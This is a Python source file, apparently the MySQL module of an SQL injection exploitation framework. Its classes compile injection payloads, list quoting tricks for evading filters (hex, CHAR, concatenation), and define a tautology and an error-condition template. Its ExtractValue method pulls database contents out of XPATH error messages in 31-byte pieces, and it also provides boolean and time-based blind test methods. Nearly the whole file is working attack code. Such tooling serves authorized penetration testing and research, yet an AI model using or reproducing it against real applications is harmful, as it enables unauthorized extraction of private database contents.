from functools import reduce

from ending.ast import *
from ending.db import generic
from ending.db.generic.map import MetadataMapper
from ending.db.generic.method import InjectForBytes
from ending.exception import ConversionError
from ending.util import quoting

__all__ = [
    "Compiler",
    "SelectMethod",
    "ExtractValueMethod",
    "TestMethod",
    "TimebasedTestMethod",
    "Mapper",
    "Features",
]


class Features(generic.Features):
    name = "MySQL"
    tautology = "ExtractValue(1,1)=1"
    quoters = [
        quoting.singlequote_backslash,
        quoting.doublequote_backslash,
        quoting.hexadecimal,
        quoting.char,
        quoting.concat_char,
    ]
    error_condition: str = (
        "(SELECT 1 UNION SELECT 2 FROM DUAL WHERE {condition})={result}"
    )


class Compiler(generic.HasConcatWSMixin, generic.Compiler):
    """Compiler for MySQL."""

    def serialize(self, node: Node) -> Node:
        match node.metadata.type:
            case TextType():
                return node
            case BlobType():
                return Hex(node)
            case BoolType() | IntType() as tpe:
                return node.with_type(tpe.to_texttype())
            case tpe:
                raise ConversionError(f"Cannot serialize type: {type(tpe).__name__}")

    def _adjust_column(self, column: Node) -> Node:
        match column.metadata.type:
            case UnknownType():
                return Function["CONVERT"](
                    Expr("{} USING latin1", column), type=BlobType()
                )
            case _:
                return column

    def compile_Query(self, query: Query, s: str) -> str:
        b = []
        q = query.q
        assert len(q.columns) > 0, "Query contains no columns"

        # If the query only consists of one column and nothing else, the SELECT
        # keyword is inessential and can be removed if it is a subquery
        if (
            "p" in s
            and len(q.columns) == 1
            and not (q.distinct or q.table or q.where or q.order or q.limit)
        ):
            return f"{q.columns[0]:p}"

        b.append("SELECT")

        if q.distinct:
            b.append("DISTINCT")

        b.append(self.compile(List[Identifier](q.columns)))

        if q.table:
            b.append(f"FROM {q.table}")

        if q.where:
            # Some MySQL versions don't support WHERE without FROM
            if not q.table:
                b.append("FROM DUAL")
            b.append(f"WHERE {q.where}")

        if q.order:
            b.append(f"ORDER BY {q.order}")

        if q.limit:
            b.append(f"{q.limit}")

        query = " ".join(b)

        if "p" in s:
            return f"({query})"
        return query

    def compile_Substring(self, substring: Substring, s):
        # MySQL supports both SUBSTRING AND SUBSTR, take the smaller one
        return super().compile_Substring(substring, s, "SUBSTR")


class ExtractValueMethod(generic.ErrorBasedMethod):
    """`ExtractValue()` SQL injection method.

    Args:
        compiler (Compiler): A DBMS compiler to compile payloads with
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
    """

    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
        hex: bool = False,
    ):
        super().__init__(
            compiler,
            inject,
            size=31,
            pattern=rb"XPATH syntax error: '\((.{,31})'",
            hex=hex
        )

    def build_payload(self, query: Query, position: int) -> Node:
        query = query.columns(Function["BINARY"](query.q.columns[0]))
        payload = super().build_payload(query, position)
        # If we don't use BINARY, multibyte characters count as one for SUBSTR,
        # but not for the max size of the error message, so we end up with a
        # trimmed message (with a "..." suffix)
        # Example: '\xc3\xa9AAAA...AA' has length N
        #          BINARY('\xc3\xa9AAAA...AA') has length N+1
        return Function["ExtractValue"]("a", Concatenation(("x(", payload)))


class SelectMethod(generic.SelectMethod):
    pass


class TestMethod(generic.ByteSumMixin, generic.TestMethod):
    pass


class TimebasedTestMethod(generic.ByteSumMixin, generic.TimebasedTestMethod):
    pass


class Mapper(MetadataMapper):
    """MySQL mapper."""
